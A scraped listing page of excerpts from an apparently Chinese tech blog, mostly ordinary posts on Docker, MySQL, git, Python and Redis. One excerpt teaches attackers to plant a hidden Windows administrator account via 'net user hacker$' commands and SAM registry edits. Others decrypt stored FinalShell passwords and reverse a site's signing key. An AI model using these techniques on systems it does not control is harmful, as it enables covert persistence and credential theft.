manifest for java:8 not found: manifest unknown: manifest unknown ，没有找到对应的jdk 把Dockerfile文件里面的 FROM java:8 改为 FROM openjdk:8
6.发布运行 $ sudo docker run -d -P --name 自定义项目名字 镜像名字 //运行镜像 $ sudo docker ps -a //查看全部运行容器 $ sudo docker logs -f 容器id	//查看容器运行日志(如果运行失败那就去这里看) 如果日志报以下错误：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e6f8b6b9d2fb2f2fcb76fa70f7770a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e418b3bad0990ad46ebdfa8c9bc6ea9/" rel="bookmark">
			VI/VIM批量删除
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 批量删除 执行命令vi命令删除光标所在的字符x删除光标位置到下一个单词开头之前内容dw删除光标位置到上一个单词结尾之后内容de删除光标位置到该行的行首的内容d0删除光标位置到该行的结尾的内容d$删除某一行dd删除第7到19行:7,19d删除第5行前每行的最后一个字符:1,5s/.$//删除所有行的最后一个字符:%s/.\{1}$//删除所有行的最后n个字符:%s/.\{n}$//删除所有行的指定字符(例如==)到每行末尾的字符:%s/==.*$//g 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65f88da32aac667a3e083b3bbc8e9433/" rel="bookmark">
			【Web安全-Windows创建影子账户】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言通过命令行添加隐藏用户通过修改注册表文件隐藏用户 前言 系统隐藏账户是一种最为简单有效的权限维持方式，其做法就是让攻击者创建一个新的具有管理员权限的隐藏账户，因为是隐藏账户，所以防守方是无法通过控制面板或命令行看到这个账户的。
通过命令行添加隐藏用户 net user hacker$ 123456 /add #添加hacker$隐藏用户 net localgroup administrators hacker$ /add #将hacker$用户添加进管理员组中 net localgroup users hacker$ /del #删除这个用户的记录 net user //并不能查看到我们创建的hacker$
通过上面的这种方法，并不能完全隐藏我们所创建的账户。
查看隐藏用户的一些方法：
通过控制面板–&gt;用户账户–&gt;管理账户依然还是可以看到隐藏账户存在的。通过管理工具–&gt;计算机管理–&gt;本地用户和组–&gt;用户 依然还是可以看到隐藏账户存在的。
通过修改注册表文件隐藏用户 首先打开注册表编辑器，找到HKEY_LOCAL_MACHINE\SAM\SAM，点击右键，选择“权限”，将Administrator用户的权限，设置成“完全控制”，然后重新打开注册表，确保可以看到SAM路径下的文件。
在SAM/Domains/Account/Users/Names处，选择Administrator用户，在右侧的键值处可以找到对应的值如0x1f4，然后从左侧的Users目录下可以找到对应的文件。
然后从对应的000001F4文件中将键值对F的值复制出来。然后同理找到隐藏账户hacker$所对应的文件，并将从Administrator文件中复制出来的F值粘贴进 hacker$文件中。
最后将hacker$ 和000003F0从注册表中右键导出，并删除hacker$用户，然后将刚刚导出的两个文件重新导入进注册表中即可实现hacker用户的隐藏。
之后运行我们导出的这两个文件，点击之后会自动导入注册表，下图是导入成功的：
此时 hacker 隐藏账户在 “控制面板（控制面板-》用户账户-》管理账户”、"管理工具-》计算机管理-》本地用户和组-》用户"均未发现，成功隐藏
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b0d55c8518cfe860eb8cd5fdf1d09fe/" rel="bookmark">
			addEventListener 方法是干什么的？底层原理是什么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		addEventListener 方法用于将事件处理函数绑定到特定的事件类型上，以便在事件被触发时执行该函数。例如，可以使用 addEventListener 方法将一个鼠标点击事件处理函数绑定到一个按钮上，当用户点击按钮时，该函数将被调用。
该方法的语法如下：
target.addEventListener(type, listener[, options]); 其中，target 表示要绑定事件处理函数的目标元素；type 表示要绑定的事件类型；listener 表示要绑定的事件处理函数；options 是一个可选的配置对象，用于指定事件处理的一些选项，例如事件是否在捕获阶段处理等。
底层原理是通过浏览器内部的事件监听机制来实现的。当使用 addEventListener 方法绑定事件处理函数时，浏览器会将该函数注册到相应的事件类型的事件队列中。当该事件类型被触发时，浏览器会按照注册顺序依次调用相应的事件处理函数。如果多个事件处理函数被绑定到同一个事件类型上，则它们将按照注册顺序依次执行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9afd91265c8f613765b3e70494f5ed92/" rel="bookmark">
			MapboxGL——marker轨迹动画效果，自定义速度。暂停继续轨迹运动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		轨迹运动的核心是不断变动marker的坐标。
最终效果：
主要参考了 Mapbox实现动态轨迹_mapbox 轨迹_二五25的博客-CSDN博客
mapbox轨迹动画效果_mapbox动画_Chaoying.的博客-CSDN博客
但是我们这里的需求有变化。使用turf.along和turf.lineChunk出来的数据，只包含坐标点.
不包含其他信息。需要携带其他的信息就没有办法。比如起点或者终点在室内，那么就办法设置楼层。
所以这里要对数组做处理。
数据处理一：将后台返回的数据处理成我们想要的格式
我这里请求路线返回的数据长这样。可以看出返回的数据结构不符合turf.lineString的要求。
处理数据，将所有的需要的数据，室内楼层，偏转角度，每段路线的终点，每段路线之间的距离通通通过handleRouteData函数处理拿到。
主要代码为：
function handleRouteData(route) { // 处理数据 返回线数据以及所以点集合 let pointCollects = [] for (let i = 0; i &lt; route.length; i++) { pointCollects.push({ "properties": { "indoor": route[i].indoor, "floor": route[i].startFloor }, 'geometry': route[i].geometry }); let str = route[i].geometry.coordinates.join(',').split(',') str = str.map(j =&gt; Number(j)) console.log("str", str) let totalPoint = [] for (let i = 0; i &lt; str.length; i++) { if (i % 2 === 0) { totalPoint.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9afd91265c8f613765b3e70494f5ed92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b926b2d1d35e64b0d8ae8c374224dcf2/" rel="bookmark">
			MySQL的binlog日志存储在哪个位置？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL的binlog日志文件默认存储在MySQL服务器的数据目录下，具体位置和命名规则取决于MySQL服务器的配置。
在Linux操作系统中，通常默认的MySQL数据目录为/var/lib/mysql，而binlog日志文件名的命名规则为mysql-bin.xxxxxx，其中xxxxxx代表一个连续递增的数字。例如，第一个binlog文件的文件名为mysql-bin.000001，第二个binlog文件的文件名为mysql-bin.000002，以此类推。
可以通过MySQL的配置文件my.cnf来查看binlog日志文件的存储位置。在my.cnf文件中，可以找到类似以下的配置项：
[mysqld] ​​​​​​​log-bin=/var/lib/mysql/mysql-bin 其中，log-bin配置项指定了binlog日志文件的存储路径，上面的配置表示binlog日志文件存储在/var/lib/mysql/mysql-bin目录下。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6996f323ce68d83b409225369b42177a/" rel="bookmark">
			git 使用学习总结和问题汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 push代码时，冲突情况情况说明参考 分支merge记录一次痛苦的mergemerge遇到的一个问题参考 Android studio 中patch的使用参考 Git分支间同步未提交的修改git stash的使用自己操作坑了自己git checkout 使用git cherry pick使用 push代码时，冲突情况 情况说明 我们看看下面的提交记录
可以看到有一次merge的记录，这是怎么造成的呢？
其实这种结果在我们开发中很常见，A开发者在本地提交了代码，commit id是d2bf0ca1，然后push到远端，B开发也在本地提交了代码，commit id是29f52e29，push的时候失败了，因为远端有新提交了；这时，我们会使用git pull，拉取远端最新提交到本地，这时就会生成a5e16740的merge记录。这种操作会导致不必要的merge 提交记录。
我们怎么避免呢？
我们在本地提交的时候，先进行pull，pull因为冲突失败的话，先把本地修改stash藏匿起来，等pull成功，git stash pop把代码还原回来。本地已经commit了，可以在pull的时候用–rebase，这样也能保证提交记录是一条直线 参考 git rebase 学习
分支merge merge分支很简单，如果没有冲突会生成一条merge commit记录，关键的遇到冲突的时候，这个就需要手动解决了。
对同一个文件的同一行代码，多条commit都修改时，就会冲突
上图发生了冲突，我们手动解决冲突，把需要的保留，不需要的删除了。
上面的冲突比较简单，很好处理。
有些文件的冲突很多，因为git是按照行比较的，一个大文件冲突的时，大面积代码是错乱的，或者有些删除的代码又回来，解决冲突很麻烦，需要认真比对。git的冲突提示只是提示我们有冲突的，有时只根据冲突标记很难解决冲突，需要我们根据业务逻辑自行分析解决。冲突解决完以后，最后通过工具（mac自带的FileMerge）比对一下文件最终是不是我们想要的。
还有二进制的jar，git合并就无能为力了，需要我们自行替换成正确的jar包。
记录一次痛苦的merge 两个分支A和B差了5个月，A分支是平时开发的分支，B分支单独做一个大功能。
现在要进行合并了，注意，我们要把B和到A上，千万别反过来，因为A是团队都在开发的分支，历时五个月更新代码量巨大。
我把B merge到A上，解决完冲突，build失败
e: java.lang.IllegalStateException: failed to analyze: com.sun.tools.javac.util.ClientCodeException: java.lang.IllegalStateException: node.sym must not be null at org.jetbrains.kotlin.analyzer.AnalysisResult.throwIfError(AnalysisResult.kt:56) at org.jetbrains.kotlin.cli.jvm.compiler.KotlinToJVMBytecodeCompiler.compileModules$cli(KotlinToJVMBytecodeCompiler.kt:182) ... Caused by: com.sun.tools.javac.util.ClientCodeException: java.lang.IllegalStateException: node.sym must not be null at com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6996f323ce68d83b409225369b42177a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/026e8524106345f2a46c4d6c427967dc/" rel="bookmark">
			在finalshell连接服务器忘记密码，程序解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.首先到finalshell安装目录中的conn文件夹中找到对应的服务器连接json文件
2.在对应json文件中找到password的值
3.运行解析程序
public static byte[] md5(byte[] data) { byte[] res=null; try { MessageDigest m; m = MessageDigest.getInstance("MD5"); m.update(data, 0, data.length); res=m.digest(); } catch (NoSuchAlgorithmException e) { log.error(e.getMessage()); } return res; } static byte[] ranDomKey(byte[] head) { long ks = 3680984568597093857L / (long)(new Random(head[5])).nextInt(127); Random random = new Random(ks); int t = head[0]; for(int i = 0; i &lt; t; ++i) { random.nextLong(); } long n = random.nextLong(); Random r2 = new Random(n); long[] ld = new long[]{(long)head[4], r2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/026e8524106345f2a46c4d6c427967dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67a1bbf49a347fff03726f1abbc08b5b/" rel="bookmark">
			C/C&#43;&#43;语言读取文件，中文乱码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		读取student.txt文件数据，根据总成绩排名，输出学生成绩。
文件内容： #include&lt;stdio.h&gt; #include&lt;iostream&gt; using namespace std; #include&lt;algorithm&gt; #include&lt;fstream&gt; struct stu{ char name[10]; int num; int english; int chinese; int math; int science; }S[100]; bool cmp(stu a,stu b){ int suma=a.english+a.math+a.science+a.chinese; int sumb=b.english+b.math+b.science+b.chinese; return suma&gt;sumb; } int main(){ fstream fp; fp.open("E:/student.txt",ios::in); char temp[100]; fp.getline(temp,100);//略过首行内容 int cnt=0; while(1){//读取文件中数据到自定义结构体中 fp.getline(temp,100); sscanf(temp,"%s %d %d %d %d %d",&amp;S[cnt].name,&amp;S[cnt].num, &amp;S[cnt].english,&amp;S[cnt].chinese,&amp;S[cnt].math,&amp;S[cnt].science); cnt++; if(fp.eof()){ break; } } sort(S,S+cnt,cmp);//排序 for(int i=0;i&lt;cnt;i++){//输出学生成绩 printf("%s %d %d %d %d %d\n",S[i].name,S[i].num, S[i].english,S[i].chinese,S[i].math,S[i].science); } fp.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/67a1bbf49a347fff03726f1abbc08b5b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2183606b34344751352847d783e8ee58/" rel="bookmark">
			快速解决eclipse无法启动，一启动就报错，且整个项目显示红色感叹号和×
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		eclipse中由于没有适配的server，所以需要用Tomcat来支持项目的运行，也会出现各种各样的错误，比如eclipse无法启动，整个项目显示红色！和红色×该如何解决？接下来我就和大家分享一下我的一些经验。
一、Tomcat在eclipse中已经存在。
解决方式：把服务器删掉就可以了。
1、点击eclipse中的Window，点击下方的preference。
2、在左上角输入server，找到server后点击Runtime Euvironments。
3、选中Tomcat后点击Remove进行删除。
4、删除后eclipse中就没有Tomcat了，点击Add进行添加，从文件夹中选中添加，就解决了！
二、项目整体报错。
解决方式，重新配置服务器。
1、选中项目名称，点击右键，选择最下方的properties。
2、选择Java Build Path，点击Libraries，点击右侧Add Libray。
3、点击Server Runtime。
4、选中，点击完成。
5、完成后回到此页面，点击Apply and Close。
6、回到页面后点击下方servers，点右键，new一个新的server。
7、选择Apache。
8、选择对应的版本。
9、点击next进入后选择项目点击Add添加后点击finish，完成。
10、测试。
1、eclipse中启动项目。
2、火狐浏览器中输入端口号测试。
成功启动！
至此，问题解决，有时候也可以两种方式一起使用。
目前就分享这两种。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b706e80e68d61578b16e423a112953bf/" rel="bookmark">
			什么时候用 redis?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		缓存 缓存现在是几乎每个中大型网站的比啥技。合理的利用缓存不仅能提升网站的访问速度，还能大大降低数据库压力。 redis的key-value键值过期机制， 提供了灵活的键淘汰策略 ，所以redis应用场景特别的多。
排行榜 很多网站都有排行榜，如京东的月度销量，商品的最新排行。 redis提供的有序集合数据类型能实现各种复杂排行榜的应用。
计数器 什么是计数器？
电商网站的浏览量、视频的播放量 。为了保证实时有效，每次浏览都得+1. 而此时如果并发量比较高的，每次访问数据库 无是种挑战和压力。
redis提供的incr命令来实现计数器，内存操作性能非常好。
非常适用于这种场景。
分布式会话 集群模式下，在应用不多的情况下，一般使用容器自带的session复制功能就能满足，当应用相对复杂的系统中，就会搭建以redisd等内存数据库为中心的缓存session服务 ，redis 不再由容器管理，而是ssession服务以及内存管理。
分布式锁 很多互联网技术中都实现了 分布式技术。
分布式技术带来的技术挑战是对同一个资源的并发访问， 如全局id，减库存，秒杀场景。
并发量不大的场景可以使用乐观锁，悲观锁。但是并发量高的场合中，数据路锁的思路不太理想，降低了db的性能。
我们这时候可以利用redis的setnx 编写分布式的锁。如果设置返回 1 说明设置成功，否则获取锁失败。
社交网络 点赞 踩 关注/被关注 共同好友等社交网络基本要求下，传统的关系数据库很难存储。
redis提供的哈希、集合等数据结构能很方便的实现这些功能
最新列表 Lpush可以在列表头部插入一个内容id作为关键字， LTRIM可以限制数量。这样列表永远为n个id，无需查询最新的列表，直接根据id去找对应的内容即可
###消 息系统
MQ-消息队列是大型网站必备的中间件。 主要用于业务解耦 流量削峰及异步处理，可实现简单的消息系统。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f77e509923c3b3327455d5865c9f18aa/" rel="bookmark">
			【干货】从小白到大牛的Python学习路线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学前须知： Python 是一种解释型、面向对象、动态数据类型的高级程序设计语言。 Python 由 Guido van Rossum 于 1989 年底发明，第一个公开发行版发行于 1991 年。
像 Perl 语言一样, Python 源代码同样遵循 GPL(GNU General Public License) 协议。
Python 是一种解释型语言： 这就说明开发过程中没有了编译这个环节。类似于PHP和Perl语言。Python 是面向对象语言: 这就说明Python支持面向对象的风格或代码封装在对象的编程技术。Python 是交互式语言： 这就说明你可以在一个 Python 提示符 &gt;&gt;&gt; 后直接执行代码。**Python 是初学者的语言：**Python 对初级程序员而言，是一种伟大的语言，它支持广泛的应用程序开发，从简单的文字处理到浏览器再到游戏。 准备：在学习之前，我们首先要思考一个问题，怎么写代码，用什么写？所以，初学者我推荐Python3.10版本，这是最成熟的版本之一，一些功能库基本上都会兼容。编译软件使用Pycharm。
0基础小白怎么学Python呢？
一、 确定学习目标
任何人，无论是学习一个新东西的时候，都首先要确定一个方向，不然就像无头苍蝇样，胡乱碰撞。只有确定了学习方向，才能一直朝着这个方向走，才能在学习中进步，才能体会Python给你带来的快乐。
二、Python基础知识学习
a. 首先了解Python是什么，它都能做些什么？ b. 需要知道什么是变量、算法、解释器 c Python的基本数据类型 d 列表和元组的操作方法 e 字符串操作方法 f 基本的字典操作方法
三、掌握Python的条件语句，判断、循环的相关执行语句
条件、判断语句：if、else、elif
循环语句：while、for
判断结束语句：continue、break
四、面对对象知识
类(Class): 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。数据成员：类变量或者实例变量, 用于处理类及其实例对象的相关的数据。方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。局部变量：定义在方法中的变量，只作用于当前实例的类。实例变量：在类的声明中，属性是用变量来表示的。这种变量就称为实例变量，是在类声明的内部但是在类的其他成员方法之外声明的。继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟"是一个（is-a）"关系（例图，Dog是一个Animal）。实例化：创建一个类的实例，类的具体对象。方法：类中定义的函数。对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。 五、实践
学习到了这个阶段了，一定要多动手实践，学了不去用，不去实操，时间过去一个月、两个月或许还记得，但时间长了，也就慢慢的忘了。在项目实践过程中出现问题，查找和处理过程中遇到的错误和异常，遇到问题多上网搜索，也可以参考公众号内的一些文章，在成功的解决了这些问题之后，你就得到一种特别的满足，特别的开心，这也是你学习Python给你带来的动力。
学习没资料，找不到方向怎么办？ 下面是针对零基础初学Python或想转行Python整理的包括学习路线、方法建议，Python实战视频+电子版本书籍+面试资料等文档免费分享给大家学习！
读者福利：2023年零基础学Python必备资料（视频+源码+工具+软件） 安全链接免费领取
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f77e509923c3b3327455d5865c9f18aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e456c419e808cc315b651fb90675fff/" rel="bookmark">
			转行IT为什么必须学Python？Python的职业发展是什么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python这个词估计听烂了…那么为什么那么多小伙伴都在学Python呢？Python到底有啥魔力？学了Python都能干啥？
为什么有必要学python
1. 为什么Python适合作为第一个学习的编程语言?
Python语言设计的初衷就是容易上手。
作为一门基础语言,融会贯通后, 有助于学习其他语言,例如PHP, Perl, Ruby等。
可以快速架起抽象的程序世界和显示世界的桥梁, 可以去Amazon购买一个廉价的Raspberry Pi,自己DIY很多人工智能,机器人相关的小Project。
诸多大公司(例如Google, IBM, Disney)的员工使用Python快速编写很多小程序来辅助和优化工作流程,减轻很多不必要的重复劳动。
Django是用Python编写的一套开源Web框架, 我们所熟知的诸多网站背后的Foundation都是Django和Python。
2. 有大量网站都是用Python搭建的。
我们就来看看有哪些Python弟子:
Pinterest、The New York Times、The Guardian、Bit Bucket、Instagram、Youtube、Dropbox、Quora、 Reddit、Spotify…这些都是由Python以及Django构架搭建的网站 。(Django是一个基于Python的网站框架)
3. 学校中,无论是商科, 经济 数理化还是工程计算机, 诸多project需要Python来完成。(其实Python可以直接当计算器)
4. 大量科学计算和金融分析使用短小精悍的Python script完成。
5. Python是Data Scientists最常用的分析工具, 有极为丰富的组建和工具包。
根据调查Python程序员的薪资普遍优秀, 根据Angel List, Python是需求量第二的技能, 也位居平均薪水最高的行列。 Python的职业发展？
有打算学习Python的同学会问，Python学完之后就业情况怎么样？薪资待遇怎样？就Python的职业发展方向，这里简单的做一些分析，给大家提供一些参考。
1. Linux运维工程师
这个职位主要就是负责Linux服务器管理，数据分析、自动化处理任务、分析网站日志、定时计划管理等等，目的是解放双手。
2. Python开发工程师
这个职位一般需要精通Python编程语言，有Django等框架的使用经验，实习无要求。
3. Python高级工程师
需要精通Linux/Unixg平台，有英语阅读功底。
4. SEO工程师
为自己或公司开发和改进SEO相关软件，实现自动化搜索引擎优化和日常重复工作。
5. Python游戏开发工程师
网络游戏后端服务器逻辑的开发和处理，有大型数据库使用经验，喜欢从事游戏相关工作。
6. Web网站开发方向
熟悉Web开发的常用 Python框架，熟悉掌握Mysql类数据库的操作即可。
7. Python自动化测试
熟悉自动化流程、方法和常用的模块的使用，有英文读写的能力。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e456c419e808cc315b651fb90675fff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1c016c570804bdfd8587a717fceba9a/" rel="bookmark">
			php二维数组去重
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最简单的二维数组去重 /** * 二维数组去重 * @param $array 二维数组 * @param $field 根据二维数组中的某个字段进行去重 * @return array|false */ public function arrayUnique($array,$field) { if(empty($array) || !$field){ return false; } //返回指定字段的一列数据 $fields = array_column($array, $field); //去重 $fields = array_unique($fields); //比较两个数组，返回交集，只比较键(key) $data = array_intersect_key($array,$fields); //重置数组的键(key) $data = array_values($data); return $data; } 下面为例子分析 1、php数组中的值是个数组，根据里面的某个值或者字段去重，其中数组如下
下面我们根据name值进行去重
$arr = [ [ 'id' =&gt; 1, 'name' =&gt; '白居易' ], [ 'id' =&gt; 1, 'name' =&gt; '白居易' ], [ 'id' =&gt; 2, 'name' =&gt; '李清照' ], [ 'id' =&gt; 3, 'name' =&gt; '孟浩然' ], [ 'id' =&gt; 3, 'name' =&gt; '孟浩然' ], [ 'id' =&gt; 1, 'name' =&gt; '李白' ], [ 'id' =&gt; 9, 'name' =&gt; '李贺' ], [ 'id' =&gt; 1, 'name' =&gt; '李白' ], [ 'id' =&gt; 2, 'name' =&gt; '李清照' ], ]; 需要去重的二维数组如下图所示
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e1c016c570804bdfd8587a717fceba9a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90b8b0b586414f6e429477280e938a3c/" rel="bookmark">
			Python JS逆向篇（二）有道翻译
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python JS逆向篇（二）有道翻译 逆向sign参数js实现py实现 解密返回结果js实现py未实现 实战 逆向主题：有道翻译sign参数及解密返回结果。
（注：文章所涉及内容只做学习参考交流，不做除此之外的任何其它用途！！！）
逆向sign参数 首先，打开浏览器抓包工具，进行页面刷新，全局搜索sign，在资源面板中打开js文件。步骤如下：
然后，Ctrl+F，搜索sign，发现只有一处（很nice），找到并打上断点。 开始在页面进行请求，断点 调试数据。
已经拦截到了， 然后就是一步步调式了。
1、进入v(t, e)函数，
2、进入g(e)函数，就进行加密了。
到此，sign参数加密就完成了。如果不知道c.a.createHash(“md5”).update(e.toString()).digest(“hex”)这个算法是怎么实现的，直接复制去百度搜索，不要跟进去一步一步扣代码！！！因为，有现成的js库，直接调用即可。
js实现 import execjs def get_sign(timestamp): js_code = ''' const crypto = require('crypto'); const l = 'fanyideskweb', d = 'webfanyi'; function g(e) { return crypto.createHash("md5").update(e.toString()).digest("hex") } function v(e, t) { return g(`client=${l}&amp;mysticTime=${e}&amp;product=${d}&amp;key=${t}`) } ''' e = 'fsdsogkndfokasodnaso' return execjs.compile(js_code).call('v', timestamp, e) if __name__ == '__main__': print(get_sign(1678674935386)) py实现 import hashlib def get_sign(timestamp): msg = f'client=fanyideskweb&amp;mysticTime={timestamp}&amp;product=webfanyi&amp;key=fsdsogkndfokasodnaso' return hashlib.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/90b8b0b586414f6e429477280e938a3c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2efa61946db194020d2ef44cfab90ff/" rel="bookmark">
			LINUX系统中MySQL8.0修改密码步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、程序报错
Your password does not satisfy the current policy requirements 译：您的密码不符合当前策略要求
You must reset your password using ALTER USER statement before executing this statement. 译：在执行此语句之前，必须使用ALTER USER语句重置密码。
2、项目背景 在LINUX系统中安装了MySQL8.0之后，使用 cat /var/log/mysqld.log 命令查看mysql的输出日志，在其中可以看到安装MySQL8.0之后，我这里的默认初始密码为k5yV0NyClY,J
对于我们平时学习来说，这密码太难记，所以我们就需要修改一个我们记得住的简单密码。
3、错误分析
查阅了许多资料与教程，MySQL5.0版本改密码的步骤为（分号不可少！！！）
set global validate_password_policy=LOW; 设置密码等级变低，方便我们设置简单密码
set global validate_password_length=6（可变）; 设置密码最小长度
set password=password('*********'); 设置密码
对于 MySQL8.0版本来说，我们得先设置密码，再设置密码等级和长度。这里一定要注意MySQL8.0版本修改密码等级和最小长度的语句 set global validate_password 后面由之前的 ‘_’ 改为了 ‘ . ’。
alter user 'root'@'localhost' identified with mysql_native_password by '****'; 修改密码
set global validate_password.policy=0; 设置密码等级变低，方便我们设置简单密码
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a2efa61946db194020d2ef44cfab90ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5aeb9f660e3719ee1e35cfa55f252e39/" rel="bookmark">
			Openresty实现web应用防火墙（waf）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Openresty简介 OpenResty 是由中国人章亦春发起，把nginx和各种三方模块的一个打包而成的软件平台，核心就是nginx+lua脚本语言。主要是因为nginx是C语言编写，修改很复杂，而lua语言则简单得多，国内很多大公司如360、京东、gitee等都在用来作为web应用防火墙。
安装openresty 部署系统为Centos7.9
1、安装依赖库
------------------------------------------------------------------------------------------ pcre-devel： 扩展的正则表达式引擎，为了使Nginx处理更复杂的正则表达式机制 openssl-devel：–with-http_ssl_module使用该模块必需装openssl库，来实现http支持https协议 zlib-devel：zlib库是网络通信压缩库，ngx_http_gzip_module（gzip压缩模块）所必需的 readline-devel：readline是安装Openresty所必须的依赖包 ------------------------------------------------------------------------------------------- yum install gcc-c++ libtool gmake make -y yum install pcre pcre-devel openssl openssl-devel zlib zlib-devel readline readline-devel -y 2、创建nginx用户组
Nginx的Master主进程以root用户身份运行，而worker子进程我们指定它为nginx用户运行
groupadd nginx useradd -d /home/nginx -g nginx -s /sbin/nologin nginx 3、编译并安装openresty
下载：wget https://openresty.org/download/openresty-1.19.9.1.tar.gz
解压tar.gz包后，进入openresty-1.19.9.1目录下，然后开始编译
./configure --prefix=/usr/local/openresty --sbin-path=/usr/local/openresty/nginx/sbin/nginx --conf-path=/usr/local/openresty/nginx/conf/nginx.conf --pid-path=/usr/local/openresty/nginx/run/nginx.pid --user=nginx --group=nginx --with-pcre --with-stream --with-threads --with-http_v2_module --with-http_ssl_module --with-http_stub_status_module --with-http_gzip_static_module --with-luajit gmake &amp;&amp; gmake install 4、编辑nginx.conf文件，配置location如下：
location / { default_type text/html; content_by_lua_block { ngx.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5aeb9f660e3719ee1e35cfa55f252e39/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43f0980ca3e3fe14f570e37a6455b86c/" rel="bookmark">
			acwing第二章学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一：单调栈
利用其单调性及先进后出的特点应用：求从右开始离自己最近比自己大的数的脚标.
所有脚标从一开始，若无目标数即输出0。
例: 5
1 4 2 3 5
输出 2 5 4 5 0
#include&lt;iostream&gt; #include&lt;stack&gt; using namespace std; const int N=1e7; int a[N],b[N]; int main() { int n; stack&lt;int&gt; stk;//stk储存的是脚标 cin&gt;&gt;n; for(int i=1; i&lt;=n; i++) scanf("%d",&amp;a[i]); for(int i=n; i&gt;=1; i--) { while(!stk.empty()&amp;&amp;a[i]&gt;=a[stk.top()]) stk.pop(); b[i]=stk.empty()?0:stk.top(); stk.push(i); } for(int i=1;i&lt;=n;i++) printf("%d ",b[i]); return 0; } 三：trie字典树
例题模板：P8306 【模板】字典树
#include&lt;iostream&gt; #include&lt;string.h&gt; using namespace std; const int N=3*1e6+100; int tot,cnt[N]; int trie[N][65]; char s1[N]; int cast(char x) { if(x&gt;='0'&amp;&amp;x&lt;='9') return x-'0';//从第零个开始 if(x&gt;='A'&amp;&amp;x&lt;='Z') return x-'A'+10;//从第十一个数开始 if(x&gt;='a'&amp;&amp;x&lt;='z') return x-'a'+36;//从第36个开始 } void insert(char s[]) { int root=0,len=strlen(s); for(int i=0;i&lt;len;i++) { int step=cast(s[i]); if(!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43f0980ca3e3fe14f570e37a6455b86c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
